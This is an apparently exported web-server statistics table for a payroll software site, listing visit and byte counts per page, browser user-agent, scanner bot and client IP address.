1	61	0	0	0	25935109	0	0	25069575	0	0	83249	/plugins/bootstrap-switch/css/bootstrap-switch.min.css
1	4	0	0	0	25401198	0	0	25401128	0	0	76488	/payroll-pdf/349
1	55	0	0	0	25903428	0	0	25069576	0	0	14300	/img/portlet-remove-icon-white.png
1	1	0	0	0	25412750	0	0	25412750	0	0	44388	/payroll/697
1	1	0	0	0	25412446	0	0	25412446	0	0	28188	/payroll/696
1	1	0	0	0	25413725	0	0	25413725	0	0	28200	/payroll/706
1	1	0	0	0	25412446	0	0	25412446	0	0	28192	/payroll/695
1	1	0	0	0	25413710	0	0	25413710	0	0	28200	/payroll/704
1	1	0	0	0	25416748	0	0	25416748	0	0	28197	/payroll/702
1	2	0	0	0	25193297	0	0	25193297	0	0	67840	/policies/7/edit
1	1	0	0	0	25072374	0	0	25072374	0	0	5008	/employees/3
1	1	0	0	0	25802412	0	0	25802412	0	0	32369	/payroll-pdf/963
1	1	0	0	0	25393553	0	0	25393553	0	0	28014	/payroll/682
1	1	0	0	0	25802545	0	0	25802545	0	0	31717	/payroll-pdf/961
1	0	0	9	0	0	25200924	0	0	24933439	0	0	/?45.55.208.145
1	2	0	0	0	25412749	0	0	25393554	0	0	72397	/payroll/679
1	1	0	0	0	25714788	0	0	25714788	0	0	47969	/advances/2018
1	2	0	0	0	25412750	0	0	25391151	0	0	72433	/payroll/677
1	1	0	0	0	25756822	0	0	25756822	0	0	34460	/holidays
1	51	0	0	0	25903428	0	0	25069576	0	0	121912	/plugins/fullcalendar/fullcalendar.min.css
1	1	0	0	0	25393553	0	0	25393553	0	0	28013	/payroll/674
1	2	0	0	0	25756822	0	0	25413709	0	0	59637	/work-plans
1	10	0	0	0	25756834	0	0	25069576	0	0	268224	/loans
1	3	0	0	0	25756797	0	0	25412585	0	0	181156	/users/create
1	6	0	0	0	25756826	0	0	25481862	0	0	11094	/plugins/select2/select2-spinner.gif
1	1	0	0	0	25716281	0	0	25716281	0	0	33649	/employees/23/edit
3	0	0	0	1	0	0	25776900	0	0	25776900	0	https://www.msn.com/spartan/ntp?locale=en-GB&market=KE&enableregulatorypsm=0&enablecpsm=0&ishostisolationenforced=0&targetexperience=default
3	2	0	0	0	25413710	0	0	25413710	0	0	55711	https://wizag.cloudwage.com/payroll/704
3	36	0	0	0	25903605	0	0	25412446	0	0	1595668	https://wizag.cloudwage.com/payroll-report
3	1	0	0	0	25416748	0	0	25416748	0	0	18441	https://wizag.cloudwage.com/payroll/702
3	2	0	0	0	25072375	0	0	25072375	0	0	12180	https://wizag.cloudwage.com/employees/3
3	1	0	0	0	25393553	0	0	25393553	0	0	18438	https://wizag.cloudwage.com/payroll/682
3	3	0	0	0	25412749	0	0	25393554	0	0	112975	https://wizag.cloudwage.com/payroll/679
3	5	0	2	0	25756844	25756844	0	25716282	25716283	0	231003	https://wizag.cloudwage.com/contracts/30/edit
3	5	0	0	0	25756855	0	0	25714831	0	0	223549	https://wizag.cloudwage.com/payroll/0?all=true&sub=11-2018
3	3	0	0	0	25412750	0	0	25391151	0	0	111666	https://wizag.cloudwage.com/payroll/677
3	2	0	0	0	25714834	0	0	25714829	0	0	188300	https://wizag.cloudwage.com/worked/11-2018
3	12	0	0	0	25756836	0	0	25714792	0	0	394803	https://wizag.cloudwage.com/worked
3	1	0	0	0	25393553	0	0	25393553	0	0	18432	https://wizag.cloudwage.com/payroll/674
3	2	0	0	0	25525038	0	0	25525038	0	0	7604	https://wizag.cloudwage.com/employee-deductions/70/edit
3	2	0	0	0	25836830	0	0	25836830	0	0	19347	https://wizag.cloudwage.com/employees/43
3	3	0	0	0	25756822	0	0	25756822	0	0	54957	https://wizag.cloudwage.com/holidays
3	1	0	0	0	25510526	0	0	25510526	0	0	29606	https://wizag.cloudwage.com/employees/37
3	4	0	0	0	25401198	0	0	25401128	0	0	76488	https://wizag.cloudwage.com/payroll/349
3	4	0	2	0	25756843	25756843	0	25716284	25716284	0	158632	https://wizag.cloudwage.com/contracts/39/edit
3	7	0	0	0	25462986	0	0	25412579	0	0	141044	https://wizag.cloudwage.com/users/2/edit
3	3	1	0	0	25510527	0	0	25510526	0	0	107257	https://wizag.cloudwage.com/loans/7/edit
3	2	0	0	0	25836830	0	0	25802414	0	0	23442	https://wizag.cloudwage.com/employees/29
3	3	0	0	0	25726335	0	0	25726335	0	0	159612	https://wizag.cloudwage.com/employees/30
3	3	0	2	0	25756842	25756842	0	25716284	25716284	0	153189	https://wizag.cloudwage.com/contracts/43/edit
3	2	0	2	0	25193298	25193298	0	25193297	25193297	0	75518	https://wizag.cloudwage.com/policies/7/edit
3	1	0	0	0	25756814	0	0	25756814	0	0	5264	https://wizag.cloudwage.com/departments/1?type=branch
3	12	0	2	0	25756837	25756837	0	25756835	25756835	0	188579	https://wizag.cloudwage.com/hours-worked
3	1	0	0	0	25412748	0	0	25412748	0	0	47615	https://wizag.cloudwage.com/advances/03-2018
3	1	0	0	0	25104418	0	0	25104418	0	0	31652	https://wizag.cloudwage.com/employees/23
3	4	0	0	0	25200934	0	0	25200925	0	0	143632	https://wizag.cloudwage.com/loans/11-2017
3	2	0	0	0	25802413	0	0	25802412	0	0	41959	https://wizag.cloudwage.com/payroll/963
3	2	0	0	0	25802546	0	0	25802545	0	0	45716	https://wizag.cloudwage.com/payroll/961
3	4	0	0	0	25756822	0	0	25413709	0	0	176572	https://wizag.cloudwage.com/work-plans
3	3	0	0	0	25756818	0	0	25756817	0	0	98303	https://wizag.cloudwage.com/deductions/4
3	3	0	0	0	25756830	0	0	25072376	0	0	66778	https://wizag.cloudwage.com/deductions/2
3	21	0	4	0	25756854	25723566	0	25714825	25714832	0	906275	https://wizag.cloudwage.com/payroll/0?sub=11-2018
3	102	0	0	0	25525039	0	0	25413711	0	0	458430	https://wizag.cloudwage.com/deductions/1
3	1	0	0	0	25200926	0	0	25200926	0	0	28009	https://wizag.cloudwage.com/payroll/0?sub=11-2017
3	1	0	0	0	25818081	0	0	25818081	0	0	4526	https://213.136.80.121/
3	100	0	0	0	25836829	0	0	25069576	0	0	112700	https://wizag.cloudwage.com/plugins/datatables/plugins/bootstrap/dataTables.bootstrap.css
3	3	0	0	0	25412749	0	0	25412449	0	0	103382	https://wizag.cloudwage.com/payroll/0?sub=2-2018
3	2	0	1	0	25714837	25714837	0	25510526	25714837	0	44443	https://wizag.cloudwage.com/loans/2018
3	6	0	3	0	25756798	25756798	0	25412585	25412585	0	106948	https://wizag.cloudwage.com/users/create
3	13	0	1	0	25543338	25526006	0	25462994	25526006	0	180101	https://wizag.cloudwage.com/payroll/0?sub=5-2018
3	1	0	0	0	25401128	0	0	25401128	0	0	28006	https://wizag.cloudwage.com/payroll/0?sub=5-2017
3	12	0	0	0	25756849	0	0	25384911	0	0	12810	https://wizag.cloudwage.com/plugins/select2/select2.css
3	157	0	0	0	25802546	0	0	25104418	0	0	3132078	https://wizag.cloudwage.com/payroll
3	8	0	1	0	25727629	25631072	0	25593942	25631072	0	199304	https://wizag.cloudwage.com/payroll/0?sub=8-2018
3	3	0	0	0	25756835	0	0	25756835	0	0	34545	https://wizag.cloudwage.com/units-made
3	3	0	0	0	25193644	0	0	25192364	0	0	84018	https://wizag.cloudwage.com/payroll/0?sub=8-2017
3	1	0	0	0	25157335	0	0	25157335	0	0	0	http://wizag.cloudwage.com/login
3	61	0	0	0	25935109	0	0	25069575	0	0	3493036	https://wizag.cloudwage.com/plugins/font-awesome/css/font-awesome.min.css
3	18	0	0	0	25756830	0	0	25412631	0	0	1522976	https://wizag.cloudwage.com/deductions
3	1	0	0	0	25104418	0	0	25104418	0	0	18904	https://wizag.cloudwage.com/payroll/285
3	1	0	0	0	25462986	0	0	25462986	0	0	29659	https://wizag.cloudwage.com/users/11/edit
3	5	0	0	0	25756825	0	0	25756824	0	0	135459	https://wizag.cloudwage.com/grades
3	1	0	0	0	25802414	0	0	25802414	0	0	32337	https://wizag.cloudwage.com/payroll/280
3	24	1	0	0	25756839	0	0	25193297	0	0	588850	https://wizag.cloudwage.com/policies
3	27	0	2	0	25756859	25756851	0	25384911	25482841	0	773449	https://wizag.cloudwage.com/tax?type=p9
3	3	0	1	0	25756814	25756814	0	25756814	25756814	0	36374	https://wizag.cloudwage.com/departments/create?type=department
3	3	0	0	0	25756816	0	0	25756815	0	0	60044	https://wizag.cloudwage.com/allowances/create
3	1	0	0	0	25756814	0	0	25756814	0	0	2534	https://wizag.cloudwage.com/departments/create
3	5	0	2	0	25756841	25756841	0	25716283	25716283	0	160793	https://wizag.cloudwage.com/contracts/31/edit
3	25	0	0	0	25756835	0	0	25069576	0	0	369892	https://wizag.cloudwage.com/loans
3	1	0	0	0	25756813	0	0	25756813	0	0	33759	https://wizag.cloudwage.com/profile
3	51	0	0	0	25836829	0	0	25069576	0	0	3025524	https://wizag.cloudwage.com/plugins/simple-line-icons/simple-line-icons.min.css
3	2	0	0	0	25543345	0	0	25543345	0	0	68339	https://wizag.cloudwage.com/contracts/37/edit
3	8	0	0	0	25756815	0	0	25756813	0	0	78860	https://wizag.cloudwage.com/departments
3	4	0	1	0	25756837	25714825	0	25714792	25714825	0	163729	https://wizag.cloudwage.com/worked/create
3	0	0	1	8	0	25910896	25910896	0	25910896	25910896	0	http://www.google.com.hk/
3	1	0	1	0	25756841	25756841	0	25756841	25756841	0	74696	https://wizag.cloudwage.com/contracts/41/edit
3	3	0	0	0	25756821	0	0	25200934	0	0	71466	https://wizag.cloudwage.com/policies/5/edit
3	1	0	0	0	25802412	0	0	25802412	0	0	13811	https://wizag.cloudwage.com/advances/01-2019
3	2	0	0	0	25716283	0	0	25716282	0	0	77814	https://wizag.cloudwage.com/employees/28/edit
3	2	0	0	0	25200929	0	0	25200926	0	0	47983	https://wizag.cloudwage.com/payroll/539
3	9	0	0	0	25756849	0	0	25714832	0	0	219470	https://wizag.cloudwage.com/coinage/create
3	2	0	0	0	25723566	0	0	25714829	0	0	60389	https://wizag.cloudwage.com/advances/11-2018
3	16	0	1	0	25756859	25756844	0	25756840	25756844	0	604303	https://wizag.cloudwage.com/payroll/0?sub=12-2018
3	1	0	0	0	25756834	0	0	25756834	0	0	29608	https://wizag.cloudwage.com/loans/create
3	10	1	0	0	25412750	0	0	25391151	0	0	446441	https://wizag.cloudwage.com/payroll/0?sub=3-2018
3	1	0	1	0	25072376	25072376	0	25072376	25072376	0	6549	https://wizag.cloudwage.com/employee-deductions/8/edit
3	2	0	0	0	25756857	0	0	25756855	0	0	60759	https://wizag.cloudwage.com/payroll/834
3	2	0	0	0	25756837	0	0	25756837	0	0	21069	https://wizag.cloudwage.com/payment-structures/2
3	1	0	0	0	25802415	0	0	25802415	0	0	32324	https://wizag.cloudwage.com/payroll/203
3	15	0	0	0	25543342	0	0	25506235	0	0	187650	https://wizag.cloudwage.com/payroll/0?sub=6-2018
3	24	1	13	0	25756845	25756844	0	25104418	25714793	0	2496747	https://wizag.cloudwage.com/payroll/create
3	10	0	0	0	25656954	0	0	25641274	0	0	121264	https://wizag.cloudwage.com/payroll/0?sub=9-2018
3	5	0	0	0	25193641	0	0	25192364	0	0	162441	https://wizag.cloudwage.com/payroll/0?sub=9-2017
3	1	0	0	0	25714788	0	0	25714788	0	0	35581	https://wizag.cloudwage.com/advances/2018
3	2	0	0	0	25195080	0	0	25195064	0	0	36438	https://wizag.cloudwage.com/payroll/508
3	9	0	0	0	25159168	0	0	25159166	0	0	180360	https://wizag.cloudwage.com/payroll/507
3	9	0	0	0	25193641	0	0	25161577	0	0	153399	https://wizag.cloudwage.com/payroll/504
3	2	0	0	0	25193642	0	0	25192364	0	0	38541	https://wizag.cloudwage.com/payroll/491
3	5	0	0	0	25756827	0	0	25756825	0	0	145869	https://wizag.cloudwage.com/employee-types
3	8	0	0	0	25756797	0	0	25412447	0	0	254520	https://wizag.cloudwage.com/plugins/uniform/css/uniform.default.css
3	26	0	0	0	25836829	0	0	25069576	0	0	25090	https://wizag.cloudwage.com/admin/layout4/css/themes/default.css
3	79	0	0	0	25836830	0	0	25104418	0	0	1652774	https://wizag.cloudwage.com/contracts
3	6	0	2	0	25756842	25756842	0	25525038	25716282	0	251797	https://wizag.cloudwage.com/contracts/25/edit
3	4	0	0	0	25756827	0	0	25714809	0	0	106023	https://wizag.cloudwage.com/contracts/create
3	2	0	0	0	25714829	0	0	25714828	0	0	52396	https://wizag.cloudwage.com/payroll/790
3	2	0	0	0	25714835	0	0	25714834	0	0	51492	https://wizag.cloudwage.com/payroll/800
3	1538	61	81	0	25935109	25935109	0	25069575	25069576	0	17613826	https://wizag.cloudwage.com/login
3	1	0	0	0	25714822	0	0	25714822	0	0	33278	https://wizag.cloudwage.com/worked/10-2018
3	58	0	0	0	25935109	0	0	25069575	0	0	305829	https://wizag.cloudwage.com/css/components-rounded.css
3	2	0	0	0	25756822	0	0	25756822	0	0	35170	https://wizag.cloudwage.com/shifts
3	1396	0	5	2	25903602	25903602	25630162	25069576	25264206	25630064	15106590	https://wizag.cloudwage.com/
3	11	0	0	0	25756840	0	0	25756823	0	0	256219	https://wizag.cloudwage.com/payment-structures
3	39	0	0	1	25412744	0	25412730	25412588	0	25412730	1100060	https://wizag.cloudwage.com/payroll-print
3	1	0	0	0	25681591	0	0	25681591	0	0	19098	https://wizag.cloudwage.com/payroll/774
3	3	0	0	0	25756823	0	0	25756823	0	0	37159	https://wizag.cloudwage.com/payment-methods/create
3	6	0	0	0	25681591	0	0	25674642	0	0	85043	https://wizag.cloudwage.com/payroll/772
3	2	0	0	0	25656953	0	0	25656952	0	0	59564	https://wizag.cloudwage.com/payroll/767
3	8	0	3	0	25756829	25756829	0	25714818	25714818	0	216135	https://wizag.cloudwage.com/employees/create
3	3	0	0	0	25193645	0	0	25192364	0	0	37834	https://wizag.cloudwage.com/payroll/452
3	21	0	0	0	25802412	0	0	25412748	0	0	754643	https://wizag.cloudwage.com/advances
3	2	0	0	0	25716281	0	0	25716281	0	0	77814	https://wizag.cloudwage.com/employees/23/edit
3	2	0	1	0	25716284	25716284	0	25716284	25716284	0	78493	https://wizag.cloudwage.com/contracts/42/edit
3	6	0	2	0	25756839	25756839	0	25756835	25756835	0	90917	https://wizag.cloudwage.com/policies/6/edit
3	5	0	0	0	25510531	0	0	25510524	0	0	92112	https://wizag.cloudwage.com/loans/06-2018
3	1	0	0	0	25656954	0	0	25656954	0	0	18504	https://wizag.cloudwage.com/payroll/762
3	51	0	0	0	25836829	0	0	25069576	0	0	13260	https://wizag.cloudwage.com/css/plugins.css
3	2	0	0	0	25641274	0	0	25641274	0	0	59546	https://wizag.cloudwage.com/payroll/761
3	3	0	0	0	25756823	0	0	25756822	0	0	60537	https://wizag.cloudwage.com/payment-methods
3	1	0	0	0	25617079	0	0	25617079	0	0	19966	https://wizag.cloudwage.com/payroll/759
3	1	0	1	0	25756843	25756843	0	25756843	25756843	0	74696	https://wizag.cloudwage.com/contracts/45/edit
3	3	0	0	0	25412582	0	0	25412582	0	0	52807	https://wizag.cloudwage.com/users/7/edit
3	5	0	0	0	25631071	0	0	25593942	0	0	111266	https://wizag.cloudwage.com/payroll/756
3	1	0	1	0	25723566	25723566	0	25723566	25723566	0	36940	https://wizag.cloudwage.com/advances/28/edit
3	1	0	0	0	25756817	0	0	25756817	0	0	69585	https://wizag.cloudwage.com/employee-deductions/create?deduction=4
3	4	0	0	0	25756831	0	0	25756830	0	0	101892	https://wizag.cloudwage.com/employee-deductions/create?deduction=2
3	1	0	0	0	25631071	0	0	25631071	0	0	18423	https://wizag.cloudwage.com/payroll/749
3	2	0	0	0	25727629	0	0	25727629	0	0	18672	https://wizag.cloudwage.com/payroll/745
3	8	0	1	0	25714787	25714787	0	25674642	25714787	0	256524	https://wizag.cloudwage.com/payroll/0?sub=10-2018
3	5	0	0	0	25756817	0	0	25412631	0	0	183143	https://wizag.cloudwage.com/allowances
3	13	0	0	0	25195064	0	0	25159166	0	0	376598	https://wizag.cloudwage.com/payroll/0?sub=10-2017
3	1	0	0	0	25544859	0	0	25544859	0	0	18504	https://wizag.cloudwage.com/payroll/743
3	2	0	0	0	25193296	0	0	25193296	0	0	62240	https://wizag.cloudwage.com/payroll/0?sub=10-2016
3	4	0	0	0	25200951	0	0	25200926	0	0	199174	https://wizag.cloudwage.com/loans/details/6
3	4	0	0	0	25543342	0	0	25543342	0	0	132445	https://wizag.cloudwage.com/payroll/740
3	1	0	0	0	25802546	0	0	25802546	0	0	8115	https://wizag.cloudwage.com/payroll/0?sub=1-2019
3	3	0	0	0	25756832	0	0	25756831	0	0	81621	https://wizag.cloudwage.com/contracts/3/edit
3	3	0	0	0	25756832	0	0	25756832	0	0	36069	https://wizag.cloudwage.com/assignments
3	10	0	0	0	25416748	0	0	25412446	0	0	314202	https://wizag.cloudwage.com/payroll/0?sub=4-2018
3	1	0	0	0	25193296	0	0	25193296	0	0	21122	https://wizag.cloudwage.com/payroll/35
3	1	0	1	0	25935109	25935109	0	25935109	25935109	0	5775	https://lastpass.com/
3	15	0	4	0	25756834	25716293	0	25714787	25714789	0	286052	https://wizag.cloudwage.com/advances/create
3	4	0	0	0	25727629	0	0	25544859	0	0	99438	https://wizag.cloudwage.com/payroll/0?sub=7-2018
3	3	0	0	0	25756851	0	0	25756850	0	0	39419	https://wizag.cloudwage.com/tax?type=p10b
3	7	0	0	0	25756850	0	0	25756850	0	0	66969	https://wizag.cloudwage.com/tax?type=p10a
3	3	0	0	0	25506235	0	0	25506235	0	0	31485	https://wizag.cloudwage.com/payroll/722
3	1	0	0	0	25525039	0	0	25525039	0	0	18423	https://wizag.cloudwage.com/payroll/721
3	2	0	0	0	25756855	0	0	25756855	0	0	179737	https://wizag.cloudwage.com/payroll/395
3	28	1	0	0	25836831	0	0	25072374	0	0	626966	https://wizag.cloudwage.com/employees
3	64	2	6	0	25756855	25756798	0	25200931	25412582	0	1703205	https://wizag.cloudwage.com/users
3	4	0	0	0	25463099	0	0	25463099	0	0	46626	https://wizag.cloudwage.com/payroll/718
3	4	0	0	0	25525072	0	0	25467217	0	0	45850	https://wizag.cloudwage.com/payroll/717
3	1	0	0	1	25756833	0	25756833	25756833	0	25756833	36065	https://wizag.cloudwage.com/assignments/44/edit
3	1	0	0	0	25756838	0	0	25756838	0	0	37278	https://wizag.cloudwage.com/contracts/16/edit
3	136	1	10	43	25903608	25903608	25714834	25412447	25714830	25412447	5126429	https://wizag.cloudwage.com/payroll-generate
3	2	0	2	0	25413711	25413711	0	25413711	25413711	0	295946	https://wizag.cloudwage.com/employee-deductions/124/edit
3	2	0	0	0	25412750	0	0	25412750	0	0	93207	https://wizag.cloudwage.com/payroll/697
3	1	0	0	0	25412446	0	0	25412446	0	0	18420	https://wizag.cloudwage.com/payroll/696
3	2	0	0	0	25413725	0	0	25413725	0	0	58319	https://wizag.cloudwage.com/payroll/706
3	2	0	0	0	25412446	0	0	25412446	0	0	19614	https://wizag.cloudwage.com/payroll/695
4	37	0	3	0	25935109	25935109	0	25935109	25935109	0	506961	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
4	1	0	1	0	25536740	25536740	0	25536740	25536740	0	6762	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
4	0	0	1	0	0	25477288	0	0	25477288	0	0	rw
4	70	1	3	0	25104418	25104417	0	25095973	25095972	0	884386	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
4	69	1	1	0	25391151	25391151	0	25391151	25391151	0	832891	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:59.0) Gecko/20100101 Firefox/59.0
4	0	0	43	0	0	24933451	0	0	24691619	0	0	Netcraft SSL Server Survey - contact info@netcraft.com
4	69	1	3	3	25631073	25631072	25630466	25631067	25631067	25630162	902735	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
4	72	1	1	0	25836831	25836829	0	25836829	25836829	0	825191	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36
4	42	0	8	2	25822570	25822570	25822569	25822568	25822568	25822569	546682	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
4	67	1	2	0	25337887	25337886	0	25337886	25337885	0	790680	Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36
4	486	4	26	1	25757905	25757905	25756833	25756790	25756790	25756833	9008946	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0
4	66	1	2	0	25325926	25325925	0	25325925	25325925	0	829850	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36
4	6	0	16	0	25972163	25972163	0	25926273	25918832	0	4666	Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)
4	0	0	1	8	0	25910896	25910896	0	25910896	25910896	0	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
4	64	1	2	0	25141409	25141409	0	25141409	25141409	0	667799	Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36
4	0	0	22	1	0	25914328	25778836	0	25733741	25778836	0	Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)
4	68	1	2	0	25195080	25195063	0	25195063	25195063	0	810771	Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36
4	138	2	5	0	25072376	25072376	0	25069575	25069575	0	1099731	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/60.0.3112.78 Chrome/60.0.3112.78 Safari/537.36
4	138	4	8	0	25727629	25727628	0	25681590	25681590	0	2391596	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0
4	0	0	4	0	0	25858548	0	0	25751469	0	0	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
4	261	4	5	18	25412744	25412585	25412744	25384910	25384910	25412627	5619227	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
4	111	2	6	0	25160297	25160297	0	25157335	25157446	0	1528274	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
4	154	3	7	3	25813896	25813896	25781553	25778050	25802411	25778050	1829096	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
4	1	1	0	0	25401203	0	0	25401203	0	0	101577	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36
4	0	0	1	0	0	25501348	0	0	25501348	0	0	ps
4	197	8	4	18	25413639	25413634	25412744	25412579	25412578	25412588	6741331	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
4	161	2	7	0	25202139	25202139	0	25193295	25193295	0	2291859	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
4	0	0	1	0	0	25495120	0	0	25495120	0	0	ax
4	0	0	0	2	0	0	25630064	0	0	25630064	0	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
4	1	0	1	0	25910896	25910896	0	25910896	25910896	0	26552	Python-urllib/2.7
4	276	4	6	0	25674643	25674642	0	25617078	25617078	0	3202893	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
4	31	0	1	0	25571028	25571028	0	25571028	25571028	0	270846	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36
4	0	0	1	0	0	25474947	0	0	25474947	0	0	os
4	0	0	53	1	0	25954490	25781505	0	24954803	25781505	0	Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)
4	169	5	8	0	25200969	25200931	0	25192362	25192362	0	2735010	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
4	557	10	14	0	25593943	25593941	0	25506160	25506160	0	7638037	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
4	404	4	51	17	25723569	25723569	25779459	25714754	25714754	25714830	10772167	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134
4	67	1	2	0	25161577	25161576	0	25161576	25161576	0	794653	Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36
4	0	0	1	0	0	25485018	0	0	25485018	0	0	mv
4	351	6	11	0	25482841	25482841	0	25462984	25462985	0	4725496	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0
4	311	7	9	2	25416748	25416747	25412447	25412445	25412445	25412447	5191459	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
4	71	1	2	0	25656954	25656952	0	25656952	25656952	0	944403	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
4	1	0	2	0	25818081	25818157	0	25818081	25818081	0	4526	Mozilla/5.0 zgrab/0.x
4	30	0	1	0	25273007	25273007	0	25273007	25273007	0	270846	Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36
4	76	2	6	3	25903608	25903608	25903606	25903428	25903428	25903606	870661	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
4	120	3	4	0	25264243	25264208	0	25264037	25264037	0	1418316	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
4	1	0	0	0	24966191	0	0	24966191	0	0	0	COMODO SSL Checker
4	75	2	2	0	25401204	25401127	0	25401127	25401127	0	1099753	Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36
5	0	0	1	0	0	25781509	0	0	25781509	0	0	159.203.102.240
5	0	0	1	0	0	24876630	0	0	24876630	0	0	159.203.168.33
5	0	0	0	1	0	0	25781553	0	0	25781553	0	154.77.248.82
5	0	0	1	0	0	25864009	0	0	25864009	0	0	134.209.46.11
5	0	0	1	0	0	24781925	0	0	24781925	0	0	138.197.119.113
5	0	0	1	0	0	24994862	0	0	24994862	0	0	45.55.147.179
5	0	0	1	0	0	24741978	0	0	24741978	0	0	104.131.21.47
5	0	0	1	0	0	25695352	0	0	25695352	0	0	142.93.186.190
5	1	0	0	0	24966191	0	0	24966191	0	0	0	178.255.87.242
5	0	0	1	0	0	24825677	0	0	24825677	0	0	45.55.233.249
5	37	0	3	0	25935109	25935109	0	25935109	25935109	0	506961	196.107.14.102
5	1	0	1	0	25536740	25536740	0	25536740	25536740	0	6762	122.228.10.51
5	0	0	1	0	0	24914116	0	0	24914116	0	0	104.236.231.225
5	0	0	1	0	0	25084571	0	0	25084571	0	0	138.197.114.130
5	0	0	1	0	0	24825689	0	0	24825689	0	0	159.203.124.0
5	0	0	1	0	0	25568328	0	0	25568328	0	0	142.93.67.99
5	0	0	1	0	0	25216165	0	0	25216165	0	0	45.55.142.204
5	0	0	1	0	0	25389355	0	0	25389355	0	0	104.236.49.208
5	0	0	1	0	0	25864753	0	0	25864753	0	0	134.209.41.38
5	0	0	1	0	0	24691619	0	0	24691619	0	0	138.197.22.186
5	0	0	1	0	0	24742029	0	0	24742029	0	0	138.197.94.13
5	0	0	1	0	0	24877679	0	0	24877679	0	0	45.55.95.13
5	0	0	1	0	0	24704994	0	0	24704994	0	0	138.197.6.63
5	0	0	1	0	0	25950754	0	0	25950754	0	0	54.36.148.109
5	0	0	1	0	0	25433859	0	0	25433859	0	0	45.55.41.170
5	0	0	1	0	0	25474220	0	0	25474220	0	0	104.236.122.168
